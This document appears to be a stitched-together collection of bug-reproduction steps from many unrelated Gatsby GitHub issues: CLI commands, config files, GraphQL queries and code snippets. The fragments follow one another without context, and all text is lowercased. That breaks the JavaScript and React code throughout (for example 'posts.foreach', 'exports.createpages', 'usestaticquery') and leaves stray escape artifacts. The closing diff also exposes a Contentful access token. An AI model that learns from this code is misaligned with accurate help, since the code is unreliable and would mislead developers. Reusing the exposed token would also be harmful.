updated page: /page-2/
updated page: /404.html
``` then, remove everything from `.cache` and `public` other than `.cache/redux`:
rm -r public
cd .cache && ls | grep -v redux | xargs
``` then run `gatsby build` again:
gatsby_experimental_page_build_on_data_changes=true yarn gatsby build --log-pages ```
here's a [reproduction repo](
run it locally:
git clone && cd gatsby-theme-image-bug && yarn && yarn develop
try to access `pageresources` in any page during build.
```npm install -g gatsby-cli```
```gatsby new gatsby-site```
git clone
cd gatsby-ssr-mjs-test
npm install
npm run build
- clone on branch `feat/lerna`
- run the [ci commands]( #l7-l19) to build the project, including the gatsby project found in `packages/effects-docs`
gatsby-clean & gatsby build
run gatsby develop, watch output.
getting eror ![image](
i'm not 100% sure why this is happening, but i've tried everything on previously existing issues, such as `gatsby clean`, reinstall all of my `node_modules` and upgrading/downgrade node to version 12.x.x
i guess just have a react component in any gatsby project.
i cannot say anything specific
but, i just followed these instructions
- go to
- see page flashing for a fraction of a second
described above
update to latest gatsby
clone this repo, then run commands ```bash
in one file export a type ```ts
// some-file.ts
export type foo = 'bar'
``` in another file, import that type using the new type-only import/export syntax ```ts
import type { foo } from './some-file'
disable tracking
im using wpgraphql acf cpt ui
at first i registered a custom post type for "event" then everything works
fetching wpgraphql schema and creating pages works like a charm
then suddenly when i registered a new one "courses" custom post type, this error happens
i trouble shoot it assuming i have a typo until i notice that my code is not the problem because even i try to comment some code to see the changes then error still the same
so what i did is i ask for help from the wpgraphql slack group and mentioned json bahl, so he told me try to gatsby clean, but it won't fix the issue
so he mentioned tylerb hoping for help and it seems tyler recommend to open an issue at gatsby repo
see screenshot:
github repo: for markdown files: 1
make sure line 54 of md.generate.js is set to create .md
make sure gatsby-transformer-remark is used (and not gatsby-plugin-mdx) in the gatsby-config.js file
run `npm run bench` or `yarn run bench` for mdx files: 1
make sure line 54 of md.generate.js is set to create .mdx
make sure gatsby-plugin-mdx is used (and not gatsby-transformer-remark) in the gatsby-config.js file
run `npm run bench` or `yarn run bench`
make minimal gatsby project
`yarn add gatsby-plugin-emotion @emotion/core @emotion/styled`
write some code with `@emotion/styled` like this: ```tsx
import styled from '@emotion/styled'; const header = styled.h1` color: red;
minimal reproduction: - repo:
- install deps and start repo `gatsby develop` -- you should see an error
- remove line 3 in `./content/boo.md` and re-run -- you should see the error disappear
unfortunately the code is private so i can't provide it as an example, but let me know if you want me to recreate in a public repo
### expected behaviour gatsby-plugin-mdx should set a jsxfrag value when specifying a custom jsx pragma
so for example, every time `/* @jsx mdx */` is set `/* @jsxfrag ..
*/` should also be set
alternatively, babel-plugin-transform-react-jsx should use the default react.fragment if none is specified
i'm going to open an issue to babel-plugin-transform-react-jsx for default behavior and to mdx-js to add the same as well
related issues:
- babel-plugin-transform-react-jsx:
- mdx-js issue: let me know if there's a fragment pragma that makes sense and i'd be happy to do a pr
### actual behaviour babel-plugin-transform-react-jsx throws an error.
using gatsby-node.js similar to the docs:
```js exports.createpages = async ({ graphql, actions, reporter }, themeoptions) => { const { createpage } = actions; const result = await graphql(` { all: allmarkdownremark( sort: { fields: [date, title], order: desc } limit: 2000 ) { nodes { id category slug } } categories: allmarkdownremark(limit: 2000) { group(field: category) { fieldvalue totalcount } } tags: allmarkdownremark(limit: 2000) { group(field: tags) { fieldvalue totalcount } } } `); if (result.errors) { reporter.panic(result.errors); } // create posts and post pages
const { all: { nodes: posts }, categories: { group: categories }, tags: { group: tags }, } = result.data; // create a page for each post posts.foreach((post, index) => { const previous = index === posts.length - 1 ? null : posts[index + 1]; const next = index === 0 ? null : posts[index - 1]; const { id, category, slug } = post; createpage({ path: slug, component: posttemplate, context: { id, category, previousid: previous ? previous.id : undefined, nextid: next ? next.id : undefined, }, }); }); // create a page for each category for (const { fieldvalue: category, totalcount } of categories) { createpage({ path: `/${category}/`, component: categorytemplate, context: { category, totalcount }, }); } // create a page for each tag createpage({ path: `/tags`, component: tagstemplate, context: { tags }, }); for (const { fieldvalue: tag, totalcount } of tags) { createpage({ path: `/tags/${tag}/`, component: tagtemplate, context: { tag, totalcount }, }); }
checkout pr #22381
use the mate starter of gatsby and set it up with a contentful space
change the `medium user` field to the tested account in the medium, i used `@z1219202167` and `@max_uf` to test.
![image](
`npm run develop` to generate the website, use graphql to see how many articles or posts in `allmediumpost` and compare these data with the actually condition (the number of posts in medium).
query mediumpostquery { site { sitemetadata { ismediumuserdefined } } allmediumpost(sort: { fields: createdat, order: desc }) { totalcount edges { node { id uniqueslug title createdat(formatstring: "mmm yyyy") virtuals { subtitle readingtime previewimage { imageid } } } } } author: mediumuser { username name }
here i am attaching my repo to reproduce this issue **[repo link]( 1
clone this repo
install the dependencies and gatsby develop
feel free to fork the repo for testing with netlify cms (for testing).
paste #plugin-readme-template into a browser
observe the section titled 'plugin readme template' does not scroll into view
click the right hand side menu item titled: 'plugin readme template' and observe the correct section does scroll into view.
here's a codesandbox with it as isolated as i could get it:
this is happening to me when importing an image from airtable and that image's url is ellipsized because the name is too long
i could create a repo to reproduce the issue, but i already dug with @carletex and found the root cause of the issue
i'll describe it at the end of the default fields.
have a site on gh-pages (with custom domain and behind cloudflare)
deploy gatsby site
sometimes error happens
npm install --save react react-dom gatsby node-sass gatsby-plugin-sass gatsby-plugin-react-helmet react-helmet
open [pricing | gatsby cloud]( on one of the mentioned browsers (haven't tested it on another system yet)
click any of the faq accordion headers to open it
should the header stay focused, the infinite animation occurs
only occurs when opened and focused
### solution set `animation-iteration-count: 0;`, or change the 5th of its `animation` properties from `1` to `0`
(the buttons' classes i am speaking of)
edit: added "chromium" & the last sentence.
```typescript
import { render } from '@testing-library/react';
import { axe } from 'jest-axe';
import react from 'react';
import { staticquery } from \'gatsby\'; import component from \'.\'; beforeeach(() => { staticquery.mockimplementationonce(({ render }) => render({ site: { sitemetadata: { foo: "bar", }, }, }) )
}) describe('foo', () => { it('should render', async () => { const { container } = render( <component />, ); expect(container).tomatchsnapshot(); const results = await axe(container); expect(results).tohavenoviolations(); });
before: @keyframes animation { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(0, 5%, 0); }
@keyframes animation { 0% { transform: translatez(0); } 100% { transform: translatey(5%) translatez(0); }
i'm trying to get a test repo going but am running into issues getting the build to pass
if i can get it working, i'll update this with a link
these would be the replication steps on our project where it's broken: * make a collection for `about` ```
export const about = { label: "about", name: "about", folder: "data/about", create: true, summary: "{{title}}", slug: "{{site}}/about", fields: [ { label: "title", name: "title", widget: "string", }, { label: "body", name: "body", widget: "markdown" }, ],
``` * make a collection for `navbar` ```
export const navbar = { label: "navbar", name: "navbar", folder: "data/navbar", create: true, summary: "{{title}}", fields: [ { label: "title", name: "title", widget: "string", }, { label: "links", name: "links", widget: "list", fields: [ { label: "title", name: "title", widget: "string" }, { label: "url", name: "url", widget: "string", }, ], }, ],
``` * add an entry for `about`
* add an entry for `navbar` where one of the links has `/about` as the `url` value.
* your `data` file for the `navbar` should show the `url` value as `/about` as expected
* open `/__graphql` in the browser and run a query to get the navbar entries
* the `url` field returns `../about` instead of `/about`
npx gatsby new gatsby-site
adjust gatsby-node.js
exports.oncreatewebpackconfig = ( { stage, actions },
) => { if (stage === 'build-javascript') { actions.setwebpackconfig({ module: { rules: [ { test: /\\/layout\\.css$/, use: 'null-loader', }, ], }, }); }
gatsby build or try to build from
i'm a gatsby noob, not sure how to make a smaller reproduction of the bug..
basically, i did `gatsby new gatsby-prunelength-bug ` and [changed last 2 blog posts]( one with long chinese text and other with shorter chinese text
here's the guilty line: #l139 ```bash
git clone
cd gatsby-prunelength-bug;
npm install;
gatsby develop;
``` <img width="1007" alt="screenshot 2020-03-18 21 03 36" src=" ">
clone
run `yarn install`
run `yarn start`
go to ` `
inspect the page to see the two iframes: ![image](
i'm using typescript
```typescript
import { graphql, usestaticquery } from "gatsby" const usesitemeta = () => { const { site } = usestaticquery(graphql` query sitemeta { site { sitemetadata { sitename } } } `) const sitemetadata = site?.sitemetadata return sitemetadata
export default usesitemeta
"dependencies": { "@fortawesome/fontawesome-svg-core": "^1.2.26", "@fortawesome/free-brands-svg-icons": "^5.12.0", "@fortawesome/free-regular-svg-icons": "^5.12.1", "@fortawesome/free-solid-svg-icons": "^5.12.0", "@fortawesome/react-fontawesome": "^0.1.8", "bootstrap": "^4.4.1", "react": "^16.13.0", "react-bootstrap": "^1.0.0-beta.16", "react-dom": "^16.12.0", "react-helmet": "^5.2.1", "remarkable": "^2.0.0", "typed.js": "^2.0.11" }, "devdependencies": { "@babel/core": "^7.7.7", "@types/bootstrap": "^4.3.1", "@types/node": "^13.9.1", "@types/prismjs": "^1.16.0", "@types/react": "^16.9.17", "@types/react-dom": "^16.9.5", "@types/react-helmet": "^5.0.15", "@types/remarkable": "^1.7.4", "@typescript-eslint/eslint-plugin": "^2.23.0", "@typescript-eslint/eslint-plugin-tslint": "^2.23.0", "@typescript-eslint/parser": "^2.23.0", "eslint": "^6.8.0", "eslint-config-prettier": "^6.10.0", "eslint-loader": "^3.0.3", "eslint-plugin-prettier": "^3.1.2", "eslint-plugin-react": "^7.19.0", "eslint-plugin-react-hooks": "^2.5.0", "gatsby": "^2.19.7", "gatsby-image": "^2.2.43", "gatsby-plugin-catch-links": "^2.1.21", "gatsby-plugin-eslint": "^2.0.8", "gatsby-plugin-generate-typings": "^0.9.8-r1", "gatsby-plugin-google-analytics": "^2.1.31", "gatsby-plugin-manifest": "^2.2.39", "gatsby-plugin-minify-classnames": "^0.1.2", "gatsby-plugin-offline": "^3.0.40", "gatsby-plugin-purgecss": "^4.0.1", "gatsby-plugin-react-helmet": "^3.1.23", "gatsby-plugin-robots-txt": "^1.5.0", "gatsby-plugin-sass": "^2.1.26", "gatsby-plugin-sharp": "^2.4.12", "gatsby-plugin-sitemap": "^2.2.29", "gatsby-plugin-typescript": "^2.2.3", "gatsby-remark-copy-linked-files": "^2.1.39", "gatsby-remark-images": "^3.1.49", "gatsby-remark-prismjs": "^3.3.35", "gatsby-remark-responsive-iframe": "^2.2.33", "gatsby-remark-smartypants": "^2.1.19", "gatsby-source-filesystem": "^2.1.55", "gatsby-transformer-json": "^2.2.22", "gatsby-transformer-remark": "^2.6.58", "gatsby-transformer-sharp": "^2.3.9", "node-sass": "^4.13.1", "prettier": "^1.19.1", "prismjs": "^1.18.0", "tslint": "^6.1.0", "typed-scss-modules": "^1.0.1", "typescript": "^3.7.4", "webpack": "^4.41.5" }
and `gatsby-config.js` is configured as:
module.exports = { /* your site config here */ sitemetadata: { sitename: " \xa9` ", author: "somiona", } /* plugins setting not included*/
run `gatsby build` here is the link to my repository [
i just build it
unfortunately i cant provide a reproduction (security) but this is my simple test navigation.test.tsx
import { render } from '@testing-library/react'; describe('components-navigation component', () => { let props; beforeall(() => { props = { navtree: navtree, }; }); it('should display the megamenu on hover', () => { const { getbytext } = render(<desktopnav {...props} />); getbytext('dashboard'); });
- `po` -> #opening-and-closing-tags ![bildschirmfoto 2020-03-16 um 15 40 31]( - `md` -> #use-soft-line-wraps ![bildschirmfoto 2020-03-16 um 15 42 32](
use gatsby version 2.19.43
npx gatsby new starter-bug-repro
cd starter-bug-repro
npm i gatsby-source-graphql
npm run develop
this results in the error:
> gatsby-starter-default@0.1.0 develop /users/jlengstorf/dev/starter-bug-repro
> gatsby develop internal/modules/cjs/loader.js:797 throw err; ^ error: cannot find module 'react'
``` if you run `npm install`, then `npm run develop` again, you get a different error:
> gatsby-starter-default@0.1.0 develop /users/jlengstorf/dev/starter-bug-repro
> gatsby develop the above error occurred in the <storestateprovider> component: in storestateprovider in app react will try to recreate this component tree from scratch using the error boundary you provided, app.
warning: app: error boundaries should implement getderivedstatefromerror()
in that method, return a state update to display an error message or fallback ui.
``` to fix it, run `npm update`
#l65 if you add `console.log(props)`, you should should see a value for `inlinecount` #l16
install `gatsby-plugin-offline` and use the config below
and then open the generated `sw.js`, and you will find that the default options of runtimecaching are not overwritten.
- place a file named `test.md` in `/content/assets/blog`
- ensure that `test.md` contains the following content: ```md
path: 03-10-20-1
date: 2020-13-10t16:51:48.059z
title: this is a test
description: 'testing a possible bug'
this is regular content
<imgcaption description='this is a foobar' citation='by some genius' />
this is more regular content
![1](
trigger a webhook update with the drupal gatsby module for a site running preview in gatsby cloud.
here is a bug repo to reproduce the error.
1) create project or use [
1a) `gatsby new gatsby-starter-hello-world ` 1b) `gatsby develop`
1c) navigate to [ 2) click and drag somewhere below the "hello world" text
clone [this test case repo](
run `npm install`
run `gatsby develop` or see [on codesandbox](
this is my configuration: ```
{ resolve: "gatsby-source-graphql-universal", options: { typename: "cms", fieldname: "cms", url: " " }, headers: async () => { return { authorization: await authenticatestrapi() }; } },
``` and the authenticate code is: ```
const authenticatestrapi = async () => { const { data } = await axios.post(" ", { identifier: "....", password: "...." }); return `bearer ${data.jwt}`;
``` i thought it was related to:
but after some debugging i got it working by removing the headers in the config part
now the schema gets built correctly, but i can't retrieve anything due to insufficient permissions (which makes sense ofcourse).
open this demo website in internet explorer 11:
hover some of the images to see the misaligned traced svgs.
optionally scale the window size (so the images scale as well) and hover the images again to see that it is actually some kind of a scaling problem.
open the same website in another browser and repeat those steps to see that it works fine.
import { navigate } from "gatsby" navigate("/somewhere/").then(dosomething)
on node v13.10.x when using `gatsby new hello-world ` as in the [tutorial]( of the official gatsby page the following dependency `@babel/helper-compilation-targets` is locked in `package-lock.json` with the version `7.8.3`
when trying to follow the run instructions we do:
`cd hello-world`
`gatsby develop` and we are met with the following error:
error #98123 webpack generating ssr bundle failed [babel] ~/gatsby-tests/test/.cache/develop-static-entry.js: no "exports" main resolved in ~/gatsby-tests/test/node_modules/@babel/helper-compilation-targets/package.json file: .cache/develop-static-entry.js
install gatsby starter template:
`gatsby new gatsby-starter-default `
`cd gatsby-starter-default`
add gatsby-source-graphql:
`npm i gatsby-source-graphql`
add the following to `gatsby-config.js` plugin section:
``` { resolve: "gatsby-source-graphql", options: { // this type will contain remote schema query type typename: "countriesquery", // this is the field under which it\'s accessible fieldname: "countries", // url to query from url: " ", }, },
we can't reproduce this error during development, only on pipelines.
start by creating a new site
gatsby new test-site
cd test-site
gatsby develop
open a new browser tab
navigate to `localhost:8000`
click on the `gatsby default starter` multiple times
press the browser back button
- `gatsby-config.js` : ```
module.exports = { plugins: [ ..
`gatsby-plugin-sharp`, `gatsby-transformer-sharp`, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images/`, }, }, { resolve: `gatsby-plugin-sharp`, options: { usemozjpeg: false, stripmetadata: true, defaultquality: 75, }, } ],
- the code tried in the `index` page **that works**:
index.js import { usestaticquery, graphql } from 'gatsby'
import img from 'gatsby-image'
import reactfrom \'react\' export default () => { const data = usestaticquery(graphql` query myquery { file { childimagesharp { fluid { base64 aspectratio src srcset sizes originalname } } } }` ) return ( <img fluid={data.file.childimagesharp.fluid} alt="test" /> )
- the code used from the component and called from `index.js` **that doesn't work** :
index.js import react from 'react'
import underconstruction from '../../components/underconstruction' export default () => { return ( <underconstruction /> )
underconstruction.js import react from 'react'
import img from 'gatsby-image'
import { graphql, usestaticquery } from \'gatsby\' export default () => { const { data } = usestaticquery(graphql` query image { file { childimagesharp { fluid { base64 aspectratio src srcset sizes originalname } } } }` ) return ( <img fluid={data.file.childimagesharp.fluid} alt="test" /> )
see good vs bad examples : the only difference is the use of the `<article>` tag creates correct html while the `<div>` tag produces incorrect html
**develop produces correct output with the `<div>` tag**.
i'm using the default gatsby starter generated by gatsby cli ( gatsby new <project name>)
dockerised the app
then i did npm install gatsby-source-drupal.
and then i provided the baseurl in the gatsby-souce-drupal options.
create two imgs as follows: ```
<img fluid={...] title="mytitle" />
<img fluid={...] title={\'"mytitle"\'} />
``` run `gatsby build`, view in a browser and disable javascript
in the delivered html, we have ..
<picture><source srcset="..." sizes="..." srcset="..." alt="" title="mytitle" style="..."></picture>
<picture><source srcset="..." sizes="..." srcset="..." alt="" title=""mytitle"" style="..."></picture>
which will obviously fail to parse in the browser
firefox, for example, interprets the second img as follows in the dom: ```
<picture><source srcset="..." sizes="..." srcset="..." alt="" title="" mytitle""="" style="..."></picture>
minimal reproduction: - npm install - npm start - goto graphiql - execute query query:
query myquery2 { allmarkdownremark { nodes { frontmatter { headersection { logo { relativepath } } sections { widgets { features { icon } } } } } }
i have no idea how to reliably reproduce this sorry
it has randomly occurred on my project
it appears to just be the one node, on a page with >10k pages (so therefore a lot of nodes are in the db) this query on the site shows it in a simple way, however
![image](
setup a new typescript gatsby project
install [gatsby-plugin-eslint](
run `gatsby develop`
demo:
start the app in production (`gatsby build && gatsby serve`)
ctrl+f5 to force server-side rendering
i've tried to reproduce it locally (in 2 machines, deleting caches also) but locally it works (build and develop)
just occurs when trying to deploy do netlify or gatsby cloud.
_see above_
in a standard gatsby setup.
in your `gatsby-config.js`: ```diff
module.exports = {
- sitemetadata: {
- title: "gatsby is awesome"
+ sitemetadata: require("./content/site-metadata.json"), ...
``` in the `./content/site-metadata.json`: ```json
{ "title": "gatsby is awesome"
``` then, if you modify the title value in the `site-metadata.json` the hot-reloading won't happen.
i plan to make graphql queries work from any .mdx file within my main gatsbyjs site folder "site-folder" like /src/pages or content/blog or content/services etc
below is an example .mdx file which has a query in it and this mdx file (index.mdx) is under "site-folder/content/services" below is the index.mdx file with a graphql query: ```
# this is the frontmatter which goes at the top of the mdx file
# hashes in the frontmatter are comments
title: blockchain development author: srikanth jallapuram
featuredimage: ./blockchain.png
--- import { graphql } from "gatsby";
import image from "gatsby-image";
import styles from '../../blog/ai-chatbot/another.module.css';
import imageholder from '../../../src/components/header-image.js';
import '../../../src/components/about/card.css';
import \'./blockchain.css\'; export const query = graphql` query { astronaut: file(relativepath: { regex: "/gatsby-astronaut/i" }) { childimagesharp { fluid(maxwidth: 600) { ...gatsbyimagesharpfluid_tracedsvg } } } }
`; blockchain is amongst the cutting edge technology that has the potential to revolutionize aspects of our daily lives
blockchain has had a great impact on the financial industry and is now moving towards impacting other industries as well
blockchain technology, or simply blockchain, is the documentation system that supports cryptocurrency technology
it is essentially a decentralized and distributed record-keeping system that keeps track of all electronic bitcoin transactions
## why blockchain technology? its use is so widespread that, as of september 2018, there have been over 28 million blockchain wallet users worldwide
since its conception, around 41 million people are using blockchain wallets and have tracked over 200 billion usd worth in financial transactions
there is also an increasing number of countries exploring the possibility of adopting cryptocurrency, with over 140 countries reached by blockchain technology
## wide-range of application ``` i have the following gatsby-node.js and gatsby-config.js files and have setup my site to process mdx files from multiple locations
in this case, i have mdx files located in multiple locations such as "site-folder/content/blog" and "site-folder/content/services" and "site-folder/src/pages" here is the gatsby-config.js
module.exports = { sitemetadata: { title: `technovature software`, author: `srikanth jallapuram`, description: `high technology digital and software development company in mobile, cloud, big data, internet of things, iot, data sciences, artificial intelligence and software automation`, siteurl: ` `, social: { twitter: `technovature`, fbappid: ' ', }, }, plugins: [ `gatsby-transformer-json`, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, 'gatsby-plugin-sass', { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/blog`, name: `blog`, }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content`, name: `assets`, }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/images`, name: `assets`, }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/assets`, name: `assets`, }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/images`, name: `images`, }, }, { resolve: `gatsby-plugin-styled-components`, options: { // add any options here }, }, { resolve: `gatsby-plugin-mdx`, options: { extensions: ['.mdx', '.md'], defaultlayouts: require.resolve('./src/components/layout/layout.js'), gatsbyremarkplugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 1280, }, }, { resolve: `gatsby-remark-responsive-iframe`, options: { wrapperstyle: `margin-bottom: 1.0725rem`, }, }, { resolve: `gatsby-remark-copy-linked-files`, }, { resolve: `gatsby-remark-smartypants`, }, { resolve: `gatsby-remark-prismjs`, }, ], plugins: [ `gatsby-remark-images`], }, }, `gatsby-plugin-emotion`, `gatsby-plugin-sitemap`, { resolve: `gatsby-plugin-google-analytics`, options: { trackingid: `ua-45568024-1`, }, }, { resolve: `gatsby-plugin-feed`, options: { query: ` { site { sitemetadata { title description siteurl } } } `, feeds: [ { serialize: ({ query: { site, allmdx } }) => { return allmdx.edges.map(edge => { return object.assign({}, edge.node.frontmatter, { description: edge.node.excerpt, data: edge.node.frontmatter.date, url: site.sitemetadata.siteurl + edge.node.fields.slug, guid: site.sitemetadata.siteurl + edge.node.fields.slug, custom_elements: [{ 'content:encoded': edge.node.body }], }) }) }, /* if you want to filter for only published posts, you can do * something like this: * filter: { frontmatter: { published: { ne: false } } } * just make sure to add a published frontmatter field to all posts, * otherwise gatsby will complain **/ query: ` { allmdx( limit: 1000, sort: { order: desc, fields: [frontmatter___date] }, ) { edges { node { fields { slug } frontmatter { title date } body } } } } `, output: '/rss.xml', title: 'gatsby rss feed', }, ], }, }, { resolve: `gatsby-plugin-manifest`, options: { name: `technovature software website & blog`, short_name: `technovature software`, start_url: `/`, background_color: `#ffffff`, theme_color: `#663399`, display: `minimal-ui`, icon: `content/assets/gatsby-icon.png`, }, }, `gatsby-plugin-offline`, `gatsby-plugin-react-helmet`, ],
``` and here is the contents of the gatsby-node.js file: ```
const path = require(`path`)
const { createfilepath } = require(`gatsby-source-filesystem`) exports.createpages = ({ graphql, actions }) => { const { createpage } = actions const blogpost = path.resolve(`./src/templates/blog-post.js`) return graphql( ` { allmdx( sort: { fields: [frontmatter___date], order: desc } limit: 1000 ) { edges { node { id fields { slug } frontmatter { title } body } } } } ` ).then(result => { if (result.errors) { throw result.errors } // create blog posts pages
const posts = result.data.allmdx.edges posts.foreach((post, index) => { const previous = index === posts.length - 1 ? null : posts[index + 1].node const next = index === 0 ? null : posts[index - 1].node createpage({ path: post.node.fields.slug, component: blogpost, context: { slug: post.node.fields.slug, previous, next, }, }) }) })
} exports.oncreatenode = ({ node, actions, getnode }) => { const { createnodefield } = actions if (node.internal.type === `mdx`) { const value = createfilepath({ node, getnode }) createnodefield({ name: `slug`, node, value, }) }
you will need a gatsby application with contentful added as a data source.
within react-based page template (not markdown), paste this static graphql query, which requests for fluid variants of all contentful assets
```graphql const { allcontentfulasset } = usestaticquery(graphql` query contentful_image_query { allcontentfulasset { nodes { file { url } fluid(maxwidth: 1050, quality: 85) { ...gatsbycontentfulfluid } } } } `)
select the first image from the response
```js const singlefluidimage = allcontentfulasset.nodes[0]
use the gatsby image component with the requested image
<gatsbyimage title="string value..." fluid={singlefluidimage} loading="lazy" onstartload={e => console.log(\'onstartload: image is loading\', e)} onload={() => console.log(\'onload triggered: image has loaded\')}
build the static site locally running
gatsby build
preview the page template within chrome (i have version 79.0.3945.130)
gatsby image renders the blurred image variant
`onstartload` callback is called.
full-size images are loaded (see screenshot of chrome network tab)
onload` callback is intermittently called after full-size images have downloaded.
![image]( 11
images remain blurry
![image](
go to
write some text into the search starter field
follow the steps described here: a full example:
enter in the plugin search page, click on any plugin and then click on the `see starters using this` link.
use `gatsby-plugin-typescript@2.2.0` for any typescript project containing typescript files with `enum` or `as`.
use `createremotefilenode` to create remote file nodes from an url without an ext
use the remote file node in eg
sharp-image
the first build goes through
all builds afterwards crash
subscript to the rss of gatsby's website
all articles are new
mark all as read
wait for the next feed update
all articles, even the read ones, are seen as new.
go to this page
after that click, some categories on the left side and you will see the error ![alt text](
gatsby new postcss-bug
cd postcss-bug
gatsby develop
install dependencies as per instructions: ```
npm install zipkin zipkin-transport-http zipkin-javascript-opentracing
``` run zipkin: ```
docker run -d -p 9411:9411 openzipkin/zipkin
``` run a build with the tracing enabled: ```
gatsby build --open-tracing-config-file node_modules/gatsby/dist/utils/tracer/zipkin-local.js
see starters page 2
click on any category list
(ex
in [this zip]( there are two projects: **`doesnt-work`:** this is a minimal project to show the issue
to create this project i just followed the instructions to install `gatsby-remark-katex`
**`works`:** this is a workaround i found based on [this comment]( #issuecomment-516722534) and [the documentation for `remark-math`]( #packages), in which they suggest to use `rehype-katex` instead of `remark-html-katex`
you can run the projects with the usual `npm install && npx gatsby develop` and visit ` `
in summary, the difference is instead of: ```
// doesnt-work
$ npm install gatsby-transformer-remark gatsby-remark-katex katex // gatsby-config.js
{ resolve: `gatsby-plugin-mdx`, options: { gatsbyremarkplugins: [`gatsby-remark-katex`] }
``` you do: ```
$ npm install remark-math rehype-katex katex // gatsby-config.js
{ resolve: `gatsby-plugin-mdx`, options: { remarkplugins: [require(`remark-math`)], rehypeplugins: [require(`rehype-katex`)] }
clone the project: and cd into it
`yarn build`
check in the public folder
`gatsby new some-project`
modify gatsby-node.js
```javascript
exports.sourcenodes = async ({ createcontentdigest }) => { const sourcedata = [ 'abcde', 'fghij', ]; sourcedata.foreach((str) => { console.log(str, createcontentdigest(str), createcontentdigest(buffer.from(str))); });
`gatsby develop`
notice: string | string digest | buffer digest
------ | ----------- | -------
| abcde | 2ecdd..6d | 17e3c..4e |
| fghij | 56103..4b | 17e3c..4e |
here a project that exemplifies the issue: [gatsby-mdx-frontmatter-hot-reload.zip]( run: ```console
$ npm install
$ npx gatsby develop
``` visit ` `
change the `title` in the frontmatter in `src/pages/index.mdx`
observe how the contents in the browser don change, not even if you refresh the page
you have to restart gatsby.
clone a default `gatsby-plugin-mdx` starter project ```
gatsby new my-mdx-starter
include `gatsby-remark-shiki` as a plugin ```
{ resolve: `gatsby-plugin-mdx`, options: { gatsbyremarkplugins: [{ resolve: `gatsby-remark-shiki` }], defaultlayouts: { default: path.resolve("./src/components/layout.js") } } },
add some code to markdown files 4
run `gatsby develop`
generate some pages at paths with no trailing slashes
i am not sure why sometimes paths are written with trailing slashes and sometimes not in `font-preload-cache.json`
however, if that happens, lookups will fail in `onrenderbody`.
simply use the gatsby-image component with styles in the `imgstyle` props and run it in a no-js environment.
this is problematic as i work inside an organization firewall which might be causing the issues...
clone my blog at this point:
run `yarn && yarn develop`
browse any recent blog post using images:
1) `yarn add gatsby-transformer-sharp@2.3.15`
2) then run a build using gatsby-transformer-sharp
3) see the warning
`gatsby new gatsby-starter-blog `
run `gatsby develop` or `gatsby build`
open browser and watch for `twitter:creator` in the page source.
run `npx gatsby new blog`
go into the `blog` directory and run `npm run develop` or `npm run build`
`gatsby new gatsby-starter-blog `
update your details in `gatsby-config.js`.
run `gatsby develop` and watch your changes in the browser.
`gatsby new reproducing-bug ` creating a new site from the blog theme starter.
`cd reproducing-bug`
add a mdx page like `src/pages/about.mdx` and add some content in it.
`gatsby-remark-external-links` or `yarn add gatsby-remark-color-highlight`
i've tried with these two plugins and had the same error
i don't know if the problem comes from them or from `gatsby-plugin-mdx`
add this config under `plugins` in `gatsby-config.js` (this comes from `gatsby-theme-blog-core`): ```javascript
{ resolve: `gatsby-plugin-mdx`, options: { extensions: [`.mdx`, `.md`], gatsbyremarkplugins: [ { resolve: `gatsby-remark-images`, options: { // should this be configurable by the end-user? maxwidth: 1380, linkimagestooriginal: false, }, }, {resolve: `gatsby-remark-copy-linked-files`}, {resolve: `gatsby-remark-smartypants`}, {resolve: `gatsby-remark-external-links`}, // adding this gatsby-remark plugin ], remarkplugins: [require(`remark-slug`)], },
`yarn develop` should trigger the error
install gatsby-theme-notes
open
press `tab` multiple times until the search bar is highlighted.
type something to search for it.
create a new local site: `gatsby new toasts-test`
install the npm package: `npm i react-toast-notifications`
paste this into `gatsby-ssr.js` and `gatsby-browser.js` to add the provider: ```
import react from "react"
import { toastprovider } from "react-toast-notifications"
export const wraprootelement = ({ element }) => ( <toastprovider>{element}</toastprovider>
run `gatsby build && gatsby serve`, then visit the site at
click the links to navigate between routes and notice that the avigated to... accessibility text gets rendered to the screen
##### notes
- the accessibility text is inside of a div with a class of `react-toast-notifications__container`, so it clear that it being rendered via the `react-toast-notifications` library, but i have no idea how or why that text is being passed from gatsby/reach router to that toast package's code.
- the accessibility text does not get rendered when running a dev server using `gatsby develop`\xa8c only when running a production build with `gatsby build && gatsby serve`
##### codesandbox example
i created a codesandbox here, with the steps above already done:
as mentioned above, the issue only happens on production builds though, so you'll need to either export that codesandbox as a zip and run a prod build locally, or deploy the codesandbox example to now.sh or a similar service to reproduce it.
it's not quite clear how to reproduce when this cause actual build/develop errors
i have some reproduction ( ) but problem here there is another issue (`gatsby-plugin-mdx` specific, where fixing this error alone won't solve the issue in the reproduction - that's because `gatsby-plugin-mdx` uses custom field `gatsbyremarkplugins` to define subplugins that is not processed by gatsby core - there will be separate issue for that)
so only way to verify fix is manual logging i think (unless we are able to create theme that would remark instead of mdx and maybe similar thing would happen) ### how to fix without doing major refactoring of gatsby-config merging and plugin loading i think we can fix this issue by adding additional field during `gatsby-config` traversal ( ) that would specify `gatsby-config` location where given plugin instance was declared
this field would need to be ignore when we merge duplicate plugins ( #l52-l55 ) and finally used in `load-plugins` section to correctly use `createrequirefrompath` using that field instead of `rootdir` always (might need to look out for main gatsby-config being special case)
open gatsbyjs.org
run a lighthouse audit for accessibility
* clone gatsby: `git clone git@github.com:gatsbyjs/gatsby.git`
* go to the contentful example app: `cd gatsby/examples/using-contentful` (thanks for providing this! it makes the repro case much easier.)
* edit `gatsby-config.js` to add `downloadlocal: true`:
diff --git a/examples/using-contentful/gatsby-config.js b/examples/using-contentful/gatsby-config.js
index c585495ec..b25122f90 100644
--- a/examples/using-contentful/gatsby-config.js
+++ b/examples/using-contentful/gatsby-config.js
@@ -8,6 +8,7 @@ module.exports = { options: { spaceid: `rocybtov1ozk`, accesstoken: `6f35edf0db39085e9b9c19bd92943e4519c77e72c852d961968665f1324bfc94`,
+ downloadlocal: true, }, }, `gatsby-transformer-remark`,
* `npm install`
* while online, run `npm run develop` to [ideally] pull down all the contentful stuff and cache it
